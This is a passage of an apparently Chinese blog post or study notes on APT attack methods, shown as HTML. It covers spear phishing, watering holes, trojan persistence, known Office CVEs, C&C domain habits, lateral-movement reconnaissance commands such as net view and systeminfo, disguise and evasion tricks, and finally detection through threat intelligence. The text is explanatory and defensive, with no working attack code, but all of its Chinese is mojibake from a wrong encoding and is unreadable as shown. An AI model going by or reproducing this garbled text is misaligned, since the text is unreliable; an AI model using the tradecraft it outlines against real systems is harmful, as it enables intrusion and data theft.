id="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"><a href="#APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ"></a>APTæ”»å‡»çš„æ­¦å™¨æ­è½½ç³»ç»Ÿ</h3><ul><li><p>é±¼å‰æ”»å‡»(Spear Phishing)</p><ul><li><p>ç›®çš„ï¼šä¸é€šè¿‡æˆæƒè®¿é—®æœºå¯†æ•°æ®</p></li><li><p>æ‰‹æ®µï¼šæœ€å¸¸è§çš„æ–¹å¼æ˜¯é€šè¿‡ç”µå­é‚®ä»¶å‘é€ç»™ç‰¹å®šçš„æ”»å‡»ç›®æ ‡ï¼Œè¯±ä½¿ç›®æ ‡æ‰“å¼€é™„ä»¶ï¼Œè¿™ç§æ–¹å¼å°±æ˜¯é±¼å‰é‚®ä»¶ã€‚</p><ul><li>é’“é±¼é‚®ä»¶ï¼šè¿™ä¸ªæ¦‚å¿µå’Œé±¼å‰é‚®ä»¶ç±»ä¼¼ã€‚ä¸è¿‡ï¼Œé’“é±¼å¤šæ˜¯é’ˆå¯¹æ™®é€šäººçš„æ”»å‡»ï¼Œé’ˆå¯¹æ€§è¾ƒå¼±ï¼Œç²¾ç¡®åº¦è¾ƒä½ã€‚</li></ul></li><li><p>å®æ–½è¿‡ç¨‹ï¼šå‰æœŸå‡†å¤‡-&gt;é‚®ä»¶åˆ¶ä½œ-&gt;é‚®ä»¶æŠ•æ”¾-&gt;æƒ…æŠ¥å›æ”¶</p></li><li><p>é˜²æŠ¤æ–¹æ³•ï¼šç¨å¾®æœ‰ç‚¹å®‰å…¨æ„è¯†å³å¯ï¼Œè®¤çœŸæŸ¥çœ‹é‚®ä»¶æ¥æºï¼Œé™„ä»¶æ‰©å±•åï¼Œç—…æ¯’æ‰«æï¼Œè™šæ‹Ÿæœºï¼Œæ²™ç®±ç­‰ã€‚</p></li></ul></li><li><p>æ°´å‘æ”»å‡»(Water Holing)</p><ul><li><p>æ”»å‡»æ¦‚è¿°ï¼šæ”»å‡»è€…é€šè¿‡åˆ†ææ”»å‡»ç›®æ ‡çš„ç½‘ç»œæ´»åŠ¨è§„å¾‹ï¼Œå¯»æ‰¾æ”»å‡»ç›®æ ‡ç»å¸¸è®¿é—®çš„ç½‘ç«™çš„å¼±ç‚¹ï¼Œå…ˆæ”»ä¸‹è¯¥ç«™ç‚¹å¹¶æ¤å…¥æ”»å‡»ç¨‹åºï¼Œåœ¨æ”»å‡»ç›®æ ‡è®¿é—®è¯¥ç«™ç‚¹æ—¶å®æ–½æ”»å‡»</p></li><li><p>ä»¥æµ·è²èŠ±APTç»„ç»‡çš„æ°´å‘æ”»å‡»ä¸¾ä¾‹</p><ul><li><p>Aæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™çš„å¯ä¿¡ç¨‹åº(æ†ç»‘å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨)</li><li>å¯¹ç›®æ ‡ç½‘ç«™æ’å…¥æ¶æ„JavaScriptç¨‹åº(ä¼ªè£…æˆAdobe Flashæ›´æ–°ç¨‹åº)</li></ul></li><li><p>Bæ–¹å¼</p><ul><li>æ›¿æ¢ç›®æ ‡ç½‘ç«™ç«™ç‚¹æŒ‡å®šé“¾æ¥</li></ul></li></ul></li></ul></li><li><p>PCè·³æ¿</p></li><li><p>ç¬¬ä¸‰æ–¹å¹³å°</p><ul><li>APTç»„ç»‡é€šè¿‡ç¤¾äº¤ç½‘ç»œæ¥ä¸‹å‘C&amp;CæŒ‡ä»¤ï¼ŒAPTç»„ç»‡çš„ä¸“ç”¨æœ¨é©¬ä¼šè¯»å–æ–‡ç« ä¸­çš„ç¨‹åºæŒ‡ä»¤æ¥å®ŒæˆæŒ‡å®šçš„æ”»å‡»æ“ä½œ</li><li>å¾®åšã€Twitterã€Facebookã€â€¦</li></ul></li><li><p>æ¶æ„ç¡¬ä»¶ä¸­é—´äººåŠ«æŒ</p><ul><li><p>åœ¨ç›®æ ‡ç½‘ç»œç¯å¢ƒä¸­éƒ¨ç½²ç‰©ç†ç¡¬ä»¶è®¾å¤‡ï¼Œé€šè¿‡ä¸­é—´äººæ–¹å¼åŠ«æŒç”¨æˆ·ç½‘ç»œæµé‡ï¼Œæ›¿æ¢æ›´æ–°åŒ…ç­‰è½¯ä»¶</p><ul><li>è¾“å…¥æ³•è½¯ä»¶ã€èŠå¤©è½¯ä»¶ã€ä¸‹è½½è½¯ä»¶ã€å½±éŸ³è½¯ä»¶ã€å®‰å…¨è½¯ä»¶ã€å¾®è½¯ç³»ç»Ÿè½¯ä»¶</li></ul></li><li><p>ä¾‹å­ï¼šç«ç„°ç—…æ¯’</p></li></ul></li></ul><h3 id="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"><a href="#APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡" class="headerlink" title="APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡"></a>APTæ”»å‡»çš„æ­¦å™¨è£…å¤‡</h3><ul><li><p>ä¸“ç”¨æœ¨é©¬</p><ul><li><p>å¼€æœºè‡ªå¯åŠ¨</p><ul><li><p>ä¿®æ”¹å¿«æ·æ–¹å¼</p></li><li><p>DLL(åŠ¨æ€é“¾æ¥åº“)åŠ«æŒ</p></li><li><p>ä¿®æ”¹æ³¨å†Œè¡¨ã€æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡</p></li><li><p>APTç»„ç»‡ä¸ºä½•æ”¾å¼ƒå¼€æœºè‡ªå¯åŠ¨ï¼Ÿ</p><ul><li><p>ç‰¹å®šåœºæ™¯ä¸‹éœ€è¦ä¸€æ¬¡æ€§æ”»å‡»</p><ul><li>ç«åŠ›ä¾¦å¯Ÿåˆ¤æ–­ç›®æ ‡æ˜¯å¦ä¸ºçœŸå®ç›®æ ‡æ—¶ã€ç›®æ ‡é˜²æŠ¤èƒ½åŠ›å¾ˆå¼ºæ—¶ï¼ˆéƒ½æ˜¯ä¸ºäº†éšè—è‡ªå·±çš„æ”»å‡»</li></ul></li><li><p>ä¾èµ–åŸå§‹æ¯ä½“æ–‡ä»¶è¿è¡Œ</p></li><li><p>ç”¨å…¶ä»–æ–¹æ³•å¯åŠ¨æœ¨é©¬</p><ul><li>æ³¨å…¥åˆ°å…¶ä»–è¿›ç¨‹ã€æˆ–è€…æ†ç»‘åˆ°å…¶ä»–è½¯ä»¶</li><li>åˆ©ç”¨æ¼æ´åŠ«æŒç¯¡æ”¹ç½‘ç»œæµé‡</li></ul></li></ul></li></ul></li><li><p>åŠ å¯†ä¸è‡ªåŠ å¯†</p></li><li><p>æœ¨é©¬å‡çº§æ¢ä»£</p></li></ul></li><li><p>1day \ nday</p><ul><li><p>å‡ºäºæ”»å‡»æŠ€æœ¯æˆæœ¬è€ƒè™‘ã€ç›®æ ‡ç³»ç»Ÿå­˜åœ¨å¤§é‡å·²çŸ¥æ¼æ´ä½†æœªä¿®å¤</p></li><li><p>ç›¸å…³ä¾‹å­</p><ul><li><p>CVE-2012-0158</p><ul><li>å¾®è½¯Officeæ¼æ´(éå¸¸ç¨³å®š)ï¼Œè¿œç¨‹æ”»å‡»è€…è¯±ä½¿ç›®æ ‡æ‰“å¼€ä¸€ä¸ªç»è¿‡ç‰¹æ®Šæ„é€ çš„RTFæ–‡ä»¶ï¼Œåœ¨ç¬¦åˆæ¼æ´æ¡ä»¶ä¸‹ï¼Œå³å¯åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„æŒ‡ä»¤ã€‚</li></ul></li><li><p>CVE-2015-0097</p><ul><li>å¾®è½¯Officeçš„ä¸€ä¸ªé€»è¾‘æ¼æ´ï¼Œå¯å¯¼è‡´ç›®æ ‡é€šè¿‡HTAæ–‡ä»¶ä¸‹è½½æ¶æ„ç¨‹åºåˆ°æœ¬æœºå¹¶æ‰§è¡Œ</li></ul></li><li><p>Android æ¼æ´</p></li></ul></li></ul></li><li><p>0day</p><ul><li>Office æ–‡æ¡£æ¼æ´</li><li>Windows ææƒæ¼æ´</li><li>Flash æ¼æ´</li><li>å…¶ä»–0day</li></ul></li><li><p>APTç»„ç»‡æ­¦å™¨ä½¿ç”¨æˆæœ¬åŸåˆ™(0dayã€æˆ–è€…æŠ€æœ¯æˆæœ¬è¾ƒé«˜çš„æ”»å‡»æ‰‹æ®µ)</p><ul><li>æ”»å‡»ç›®æ ‡å…·æœ‰è¶³å¤Ÿçš„æ”»å‡»ä»·å€¼</li><li>ä¸€èˆ¬çš„ä¸“ç”¨æœ¨é©¬æ”»å‡»æ— æ•ˆæˆ–è€…æ— æ³•è¾¾åˆ°é¢„æœŸç›®çš„</li><li>åˆ©ç”¨1dayã€ndayæ”»å‡»ä¾ç„¶æ— æ³•è¾¾åˆ°ç›®çš„æˆ–è€…æ— æ•ˆ</li></ul></li><li><p>APTæ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ç‰¹åˆ«å…³æ³¨ç‚¹ï¼šRAT(Remote Access Trojan)æ–‡ä»¶,è¿œç¨‹è®¿é—®æœ¨é©¬çš„æ–‡ä»¶æ ¼å¼ã€æ–‡ä»¶å½¢æ€ã€åŠŸèƒ½å½¢æ€ã€æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®çš„å˜åŒ–</p></li><li><p>ç›¸å…³æ­¦å™¨ç ”å‘è¶‹åŠ¿</p><ul><li><p>ä»PEåˆ°éPEï¼Œä»æœ‰å®ä½“åˆ°æ— å®ä½“</p></li><li><p>å°ä¼—ç¼–ç¨‹è¯­è¨€æ—¥æ¸æµè¡Œ(Delphi\GCC\NSIS\AutoIt</p></li><li><p>æ¨¡å—äº’åŠ¨ï¼Œäº‘æ§æŠ€æœ¯æ¸æˆä¸»æµ</p></li><li><p>æ¶æ„ç¨‹åºå¯„å®¿ä½ç½®è¶Šè—è¶Šæ·±ï¼šä»å¸¸è§çš„ç³»ç»Ÿç›®å½•åˆ°éš¾ä»¥è¿½è¸ªçš„MBR, VBR, ç£ç›˜å›ºä»¶, EFI, BIOS, ç§»åŠ¨å­˜å‚¨è®¾å¤‡çš„éšè—åˆ†åŒº</p></li><li><p>ç‹¬ç«‹ç ”å‘ä¸å§”æ‰˜å®šåˆ¶æˆä¸»æµ</p><ul><li>ä½¿ç”¨å…¬å¼€çš„RATï¼Œç›®çš„æ˜¯è‡ªæˆ‘éšè—å’Œå«ç¥¸ä»–äºº</li><li>ç»å¤§éƒ¨åˆ†çš„APTç»„ç»‡éƒ½æ˜¯åœ¨ç›¸å¯¹ç‹¬ç«‹çš„ç¯å¢ƒä¸‹å®Œæˆæ”»å‡»ä»£ç çš„å¼€å‘å·¥ä½œ</li><li>ä¸æ’é™¤å§”æ‰˜ç¬¬ä¸‰æ–¹ç»„æˆååŠ©å®šåˆ¶å¼€å‘çš„å¯èƒ½æ€§</li></ul></li></ul></li></ul></li></ul><h3 id="APTæ”»å‡»çš„-C-amp-C-Command-and-Control"><a href="#APTæ”»å‡»çš„-C-amp-C-Command-and-Control" class="headerlink" title="APTæ”»å‡»çš„ C&amp;C(Command and Control)"></a>APTæ”»å‡»çš„ C&amp;C(Command and Control)</h3><ul><li>ä¸»è¦ä½œç”¨ï¼š</li></ul><p>1.å‘æ„ŸæŸ“äº†ç›®æ ‡æœºçš„æœ¨é©¬ç¨‹åºå‘é€æ§åˆ¶å‘½ä»¤ï¼Œæä¾›ä¸‹è½½èµ„æº(æ–°æœ¨é©¬ï¼Œæœ¨é©¬æ¨¡å—ï¼Œé…ç½®æ–‡ä»¶ç­‰)<br>2.å›æ”¶æœ¨é©¬ç¨‹åºæ”¶é›†åˆ°çš„æƒ…æŠ¥ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ–‡ä»¶ã€é‚®ä»¶ç­‰</p><ul><li><p>åœ°åŸŸåˆ†å¸ƒ</p><ul><li><p>ç¾å›½æœ€å¤šã€å…¶æ¬¡ä¸­å›½ã€ä¿„ç½—æ–¯ï¼Œè¥¿ç­ç‰™ï¼Œå¾·å›½å¹¶åˆ—ç¬¬ä¸‰(2015å¹´)</p><ul><li>ä¸€ä¸ªAPTç»„ç»‡å¯èƒ½æ‹¥æœ‰æ•°åä¸ªï¼Œæˆ–è€…å‡ ä¸ªåˆ†å¸ƒäºä¸åŒåœ°åŸŸçš„C&amp;CæœåŠ¡å™¨</li></ul></li></ul></li><li><p>æ³¨å†Œæœºæ„</p><ul><li><p>å›½å†…å¤–APTç»„ç»‡å‡ä½¿ç”¨æˆ–éƒ¨åˆ†ä½¿ç”¨å¢ƒå¤–æœåŠ¡å•†åŠ¨æ€åŸŸåï¼ŒChangIP,DynDNS,No-IP,Afraid(FreeDNS),dnsExit</p><ul><li>åŠ¨æ€åŸŸåçš„å¥½å¤„ï¼š</li></ul></li></ul></li></ul><p>1.ç›¸å…³æ³¨å†Œä¿¡æ¯ä¸å¯¹å¤–å…¬å¼€(æ— whoisä¿¡æ¯)<br>2.éœ€è¦åŸŸåæŒæœ‰è€…çš„æƒé™æ‰èƒ½æŸ¥è¯¢ç›¸å…³ä¿¡æ¯</p><ul><li><p>æ³¨å†Œåå¥½</p><ul><li><p>æ¨¡ä»¿é‚®ç®±ç±»</p><ul><li>126mailserver ã€mail163ç­‰</li></ul></li><li><p>æ¨¡ä»¿æ€æ¯’è½¯ä»¶ç±»</p><ul><li>safe360ã€risingç­‰</li></ul></li><li><p>æ¨¡ä»¿äº’è”ç½‘å…¬å¸ç±»</p><ul><li>360sc2ã€sohuã€sogouã€sinaç­‰</li></ul></li></ul></li></ul><h2 id="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"><a href="#APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ" class="headerlink" title="APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ"></a>APTæ”»å‡»çš„æˆ˜æœ¯å¸ƒé˜µ</h2><h3 id="æƒ…æŠ¥æ”¶é›†"><a href="#æƒ…æŠ¥æ”¶é›†" class="headerlink" title="æƒ…æŠ¥æ”¶é›†"></a>æƒ…æŠ¥æ”¶é›†</h3><ul><li><p>é‡è¦æ€§ï¼šAPTç»„ç»‡å‘åŠ¨ä¸€æ¬¡æ”»å‡»ï¼Œç»å¤§éƒ¨åˆ†æ—¶é—´éƒ½ä¼šæ¶ˆè€—åœ¨æƒ…æŠ¥æ”¶é›†ç¯èŠ‚ä¸Šã€‚ä¸ºäº†è¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œæ”»å‡»è€…å¿…é¡»å°½å¯èƒ½åœ°å…¨é¢çš„æ”¶é›†æ”»å‡»ç›®æ ‡ç›¸å…³çš„æƒ…æŠ¥ä¿¡æ¯ï¼Œä»è®¤çŸ¥æ°´å¹³åˆ°æŒæ¡æ°´å¹³ã€‚</p></li><li><p>å…¬å¼€æƒ…æŠ¥æ”¶é›†</p><ul><li>å®˜æ–¹ç½‘ç«™ã€è¡Œä¸šç½‘ç«™ã€å­¦æœ¯æœŸåˆŠã€è¡Œä¸šä¼šè®®ã€æ–°é—»æŠ¥é“ç­‰</li></ul></li><li><p>åœ°ä¸‹æƒ…æŠ¥æ”¶é›†</p><ul><li>åœ°ä¸‹é»‘å¸‚è´­ä¹°ç¤¾å·¥åº“</li><li>å…¥ä¾µç¬¬ä¸‰æ–¹ç½‘ç«™ä»¥è·å–ç›®æ ‡äººå‘˜ã€ç»„ç»‡çš„æƒ…æŠ¥ä¿¡æ¯</li><li>å‘å…¶ä»–APTç»„ç»‡è´­ä¹°æƒ…æŠ¥ä¿¡æ¯</li></ul></li></ul><h3 id="ç«åŠ›ä¾¦å¯Ÿ"><a href="#ç«åŠ›ä¾¦å¯Ÿ" class="headerlink" title="ç«åŠ›ä¾¦å¯Ÿ"></a>ç«åŠ›ä¾¦å¯Ÿ</h3><ul><li>ç›®çš„ï¼šæ”¶é›†æ”»å‡»ç›®æ ‡ç½‘ç»œæˆ–è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯ã€åˆ¤æ–­æ”»å‡»ç›®æ ‡çš„çœŸä¼ª(æ˜¯å¦ä¸ºè™šæ‹Ÿæœº)ã€é˜²å¾¡èƒ½åŠ›ã€æ”»å‡»ä»·å€¼ã€‚ä»¥åŠæ–¹ä¾¿åæœŸæ¨ªå‘ç§»åŠ¨çš„å‡†ç¡®æ€§ã€‚</li><li>ä¸»æœºä¿¡æ¯ï¼šæ“ä½œç³»ç»Ÿä¿¡æ¯ã€ä¸»æœºåç§°ã€æœ¬åœ°ç”¨æˆ·åç­‰</li><li>ç½‘ç»œä¿¡æ¯ï¼šä¸»è¦æ˜¯IPåœ°å€ã€ç½‘å…³ä¿¡æ¯</li><li>åº”ç”¨ç¨‹åºä¿¡æ¯åŠç›¸å…³ç‰ˆæœ¬ä¿¡æ¯ï¼Œå¾®è½¯Officeã€å¾®è½¯Internet Explorer</li><li>ç£ç›˜ä¿¡æ¯ã€å½“å‰è¿›ç¨‹ä¿¡æ¯ç­‰</li></ul><h3 id="ä¾›åº”é“¾æ”»å‡»"><a href="#ä¾›åº”é“¾æ”»å‡»" class="headerlink" title="ä¾›åº”é“¾æ”»å‡»"></a>ä¾›åº”é“¾æ”»å‡»</h3><ul><li><p>æ”»å‡»åŸç†</p><ul><li>å½“æ”»å‡»ç›®æ ‡æœ¬èº«çš„é˜²å¾¡æªæ–½ç‰¹åˆ«å®Œå–„æ—¶ï¼Œæˆ–åˆå§‹æ”»å‡»æ— æ³•è¾¾åˆ°æ•ˆæœï¼Œå¯¹ç›®æ ‡ç›¸å…³çš„å‘¨è¾¹ä¼ä¸šã€äººå‘˜ã€ä¾›åº”é“¾è¿›è¡Œæ”»å‡»ï¼Œæœ‰å¯èƒ½å–å¾—è¾ƒå¥½çš„æ•ˆæœã€‚</li></ul></li><li><p>å…¸å‹æ¡ˆä¾‹</p><ul><li>éœ‡ç½‘ç—…æ¯’ã€Havex</li></ul></li></ul><h3 id="å‡æ——è¡ŒåŠ¨"><a href="#å‡æ——è¡ŒåŠ¨" class="headerlink" title="å‡æ——è¡ŒåŠ¨"></a>å‡æ——è¡ŒåŠ¨</h3><ul><li><p>æ¦‚è¿°</p><ul><li><p>ä¹Ÿå«ä¼ªæ——è¡ŒåŠ¨ï¼Œæ˜¯éšè”½è¡ŒåŠ¨çš„ä¸€ç§ã€‚é€šè¿‡ä½¿ç”¨å…¶ä»–ç»„ç»‡çš„æ——å¸œã€åˆ¶æœç­‰æ‰‹æ®µè¯¯å¯¼å…¬ä¼—ã€ä½¿å…¬ä¼—è®¤ä¸ºè¯¥æ”»å‡»æ˜¯å…¶ä»–æ”»å‡»ç»„ç»‡æ‰§è¡Œã€‚</p><ul><li>ç›¸å…³æˆ˜æœ¯æœ¯è¯­ï¼šæ‹Ÿæ€ã€è¯±é¥µã€æ··æ·†ã€ä¼ªè£…ã€å¹²æ‰°</li></ul></li></ul></li><li><p>ç±»å‹</p><ul><li><p>é¢„è®¾é™·é˜±</p><ul><li>æ ·æœ¬æ–‡ä»¶ã€C&amp;CæœåŠ¡å™¨åŸŸåã€ç‰¹æ®Šå­—ç¬¦ä¸²ã€ä¸Šçº¿å¯†ç ã€è¯±é¥µæ–‡æ¡£å±æ€§ä¿¡æ¯ç­‰</li></ul></li><li><p>äº‹åæ©ç›–</p><ul><li>æ”»å‡»æˆåŠŸåï¼Œå¯¹åŸŸåwhoisã€IPåœ°å€ç­‰ä¿¡æ¯è¿›è¡Œä¼ªè£…</li></ul></li></ul></li><li><p>å†’å……å¯¹è±¡</p><ul><li>å†’å……å…¶ä»–APTç»„ç»‡</li><li>å†’å……æ™®é€šç”¨æˆ·</li></ul></li><li><p>å›½å®¶çº§æƒ…æŠ¥æœºæ„å¯¹è¯¥è¡ŒåŠ¨çš„è§‚ç‚¹</p><ul><li><p>äº”çœ¼è”ç›Ÿ</p><ul><li>ä¸æ¬ºéª—ç›¸å…³çš„ç­–ç•¥ï¼šæš—åŒº(DarkSpace)ã€èœœç½(Honeypot)ã€èœœä»¤(Honeytoken)ã€èœœç½‘(Honeynet)ã€å‡æ——è¡ŒåŠ¨(False Flag)ã€æ•ˆæœ(Effects)</li></ul></li><li><p>äº”çœ¼è”ç›Ÿå¯¹å‡æ——è¡ŒåŠ¨çš„è§‚ç‚¹ï¼š1.æœ‰æ„åˆ¶é€ æ”»å‡»ç›®æ ‡ä¸è¢«å«ç¥¸å›½æˆ–ç»„ç»‡é—´ç´§å¼ çš„æ•Œå¯¹æ°”æ°›ï¼Œä»¥å®ç°æŸç§æ”¿æ²»æˆ–ç»æµç›®çš„ 2.æ›´å¥½åœ°éšè—è‡ªå·±ï¼Œé¿å…æš´éœ²ï¼Œæ”¶è·æ›´å¤§åˆ©ç›Šã€‚</p></li></ul></li></ul><h3 id="å‘¨æœŸæ€§è¢­æ‰°"><a href="#å‘¨æœŸæ€§è¢­æ‰°" class="headerlink" title="å‘¨æœŸæ€§è¢­æ‰°"></a>å‘¨æœŸæ€§è¢­æ‰°</h3><ul><li>å‘¨ä¸€ã€äºŒï¼ˆå·¥ä½œæ—¥å¤„ç†é‚®ä»¶ã€æ–‡ä»¶é«˜å³°æœŸï¼‰</li><li>å¤§å‹èŠ‚æ—¥ï¼ˆå¦‚å›½åº†èŠ‚ã€æ˜¥èŠ‚ç­‰ï¼‰</li></ul><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ul><li>ç›®çš„ï¼š</li></ul><p>1.è¿›ä¸€æ­¥åœ¨æ„ŸæŸ“çš„ç›®æ ‡æœºå™¨ä¸Šè·å–æ›´å¤šæœ‰ä»·å€¼çš„ä¿¡æ¯<br>2. å€ŸåŠ©å—æ„ŸæŸ“çš„æœºå™¨ï¼Œæ¢æµ‹å‘¨è¾¹å…¶ä»–è®¾å¤‡çš„æƒ…å†µæˆ–ç›´æ¥å‘å‘¨è¾¹è®¾å¤‡å‘åŠ¨æ”»å‡»</p><ul><li><p>æ¨ªå‘ç§»åŠ¨æ”»å‡»æ­¥éª¤</p><ul><li>ä¾¦å¯Ÿå’Œè¯†åˆ«ç½‘ç»œæ‹“æ‰‘ã€è·å–åŸŸè®¡ç®—æœºä¿¡æ¯ã€å½“å‰è®¡ç®—æœºç›¸å…³ä¸»æœºä¿¡æ¯ã€ç½‘å¡ä¿¡æ¯ã€è·¯ç”±ä¿¡æ¯ç­‰</li><li>æŸ¥çœ‹è¿œç¨‹è®¡ç®—æœºæœåŠ¡åŠçŠ¶æ€ã€è·å–æŒ‡å®šIPå…±äº«ä¿¡æ¯ã€å…±äº«ç›®å½•ã€æ‰«æå†…ç½‘æœºå™¨è¿œç¨‹ç«¯å£ç­‰</li><li>è¡¥å……åŸæœ‰æœ¨é©¬æ²¡æœ‰çš„åŠŸèƒ½ã€çªƒå–æœ¬æœºæ›´å¤šä¿¡æ¯ã€å‘å‘¨è¾¹å…¶ä»–è®¾å¤‡å‘åŠ¨æ”»å‡»</li><li>å¸¸ç”¨å‘½ä»¤ï¼šnet viewã€ipconfig /allã€netstat -a/nã€nbstat -Aã€systeminfoã€tracert -w 1000 8.8.8.8ã€pingã€telnetã€åˆ©ç”¨PowerShellè¿œç¨‹åŠ è½½æœ¨é©¬æˆ–è€…ä¸Šä¼ æƒ…æŠ¥ä¿¡æ¯åˆ°C&amp;CæœåŠ¡å™¨</li></ul></li></ul><h3 id="ä¼ªè£…æœ¯"><a href="#ä¼ªè£…æœ¯" class="headerlink" title="ä¼ªè£…æœ¯"></a>ä¼ªè£…æœ¯</h3><ul><li><p>ç¤¾ä¼šå·¥ç¨‹å­¦ä¼ªè£…</p><ul><li>é‚®ä»¶å†…å®¹ä¼ªè£…</li><li>é‚®ä»¶èº«ä»½ä¼ªè£…</li></ul></li><li><p>æ–‡ä»¶è§†è§‰ä¼ªè£…</p><ul><li>æ–‡ä»¶å</li><li>æ–‡ä»¶æ‰©å±•å</li><li>æ–‡ä»¶å›¾æ ‡</li></ul></li><li><p>å¿«æ·æ–¹å¼ä¼ªè£…</p><ul><li>å°†æ”»å‡»ä»£ç æ–‡ä»¶å’Œä¸€ä¸ªæŒ‡å‘æ”»å‡»ä»£ç çš„å¿«æ·æ–¹å¼æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©åŒ…ï¼ŒåŒæ—¶ï¼Œå¿«æ·æ–¹å¼çš„å‘½åå…·æœ‰è¿·æƒ‘æ€§</li></ul></li><li><p>æ†ç»‘åˆæ³•ç¨‹åº</p><ul><li><p>AWVS7</p><ul><li>é’ˆå¯¹ç½‘ç»œå®‰å…¨è¡Œä¸š</li></ul></li><li><p>åŠå…¬è½¯ä»¶</p><ul><li>æ”¿åºœå•ä½ã€äº‹ä¸šå•ä½</li></ul></li><li><p>å³æ—¶é€šã€è¯ä¹¦é©±åŠ¨</p><ul><li>æ”¿åºœæœºæ„</li></ul></li><li><p>å¾®è½¯æ›´æ–°ç¨‹åº</p></li><li><p>Microsoft Visio Professional 2013</p></li></ul></li><li><p>å‹ç¼©åŒ…å¤–å£³</p><ul><li>å°†æœ¨é©¬ç¨‹åºè¿›è¡Œå‹ç¼©ï¼Œä»¥å‹ç¼©åŒ…çš„å½¢å¼ä¼ æ’­</li></ul></li></ul><h3 id="åä¾¦å¯Ÿæœ¯"><a href="#åä¾¦å¯Ÿæœ¯" class="headerlink" title="åä¾¦å¯Ÿæœ¯"></a>åä¾¦å¯Ÿæœ¯</h3><ul><li>ä¸€äº›APTç»„ç»‡çš„æ”»å‡»æœ¨é©¬ä¼šåˆ¤æ–­è‡ªèº«æ‰€å¤„çš„ç¯å¢ƒã€å‘ç°æ€è½¯æ—¶ã€ä¼šé€‰æ‹©æ”¾å¼ƒæ‰§è¡Œåç»­çš„åŠŸèƒ½ä»£ç ã€æˆ–è€…è®¾æ³•ç»•è¿‡æ€è½¯çš„ç›‘æµ‹ã€‚</li><li>ä¸€äº›APTç»„ç»‡ä¼šå¯¹å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œåå‘ä¾¦å¯Ÿå·¥ä½œï¼Œæ¯”å¦‚æµ·è²èŠ±ç»„ç»‡å‘AWVSçš„ç ´è§£ç‰ˆä¸­æ’å…¥äº†æœ¨é©¬ã€‚</li></ul><h2 id="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"><a href="#APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡" class="headerlink" title="APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡"></a>APTæ”»å‡»çš„ç›‘æµ‹ä¸é˜²å¾¡</h2><h3 id="å¦‚ä½•å‘ç°APTæ”»å‡»"><a href="#å¦‚ä½•å‘ç°APTæ”»å‡»" class="headerlink" title="å¦‚ä½•å‘ç°APTæ”»å‡»"></a>å¦‚ä½•å‘ç°APTæ”»å‡»</h3><ul><li><p>å¤§æ•°æ®æŠ€æœ¯</p><ul><li>æ•°æ®é‡‡é›†ã€æ•°æ®åˆ†æã€æ•°æ®å‘ˆç°</li></ul></li><li><p>å¨èƒæƒ…æŠ¥æŠ€æœ¯</p><ul><li><p>â€œæ ‡å¿—â€(Indicator of Compromise,IOC),ä¹Ÿå«å…¥ä¾µæŒ‡ç¤ºå™¨ï¼šé€šå¸¸åŒ…æ‹¬ä¸»æœºæ´»åŠ¨ä¸­å‡ºç°çš„æ–‡ä»¶ã€è¿›ç¨‹ã€æ³¨å†Œè¡¨é”®å€¼ã€ç³»ç»ŸæœåŠ¡ã€ç½‘ç»œä¸Šçš„åŸŸåã€URLã€IPç­‰</p></li><li><p>åˆ†ç±»</p><ul><li><p>æˆ˜æœ¯æƒ…æŠ¥</p><ul><li>æ ‡è®°æ”»å‡»è€…ä½¿ç”¨å·¥å…·ç›¸å…³çš„ç‰¹çº¸å€¼åŠç½‘ç»œåŸºç¡€è®¾æ–½ä¿¡æ¯ã€å¯ç›´æ¥ç”¨äºè®¾å¤‡ã€å®ç°å¯¹æ”»å‡»æ´»åŠ¨çš„ç›‘æ§ï¼ŒIOCå³æ˜¯ä¸€ä¸ªå…¸å‹</li></ul></li><li><p>ä½œæˆ˜æƒ…æŠ¥</p><ul><li>æè¿°æ”»å‡»è€…çš„å·¥å…·ã€æŠ€æœ¯å’Œè¿‡ç¨‹ï¼Œå³TTP</li></ul></li><li><p>æˆ˜ç•¥æƒ…æŠ¥</p><ul><li>æè¿°å½“å‰å¯¹äºç‰¹å®šç»„ç»‡çš„å¨èƒç±»å‹å’Œå¯¹æ‰‹ç°çŠ¶ã€æŒ‡å¯¼å®‰å…¨æŠ•èµ„çš„å¤§æ–¹å‘ã€‚ä½¿ç”¨è€…ä¸ºCSO(Chief Security Officer), CISO(Chief Information Security 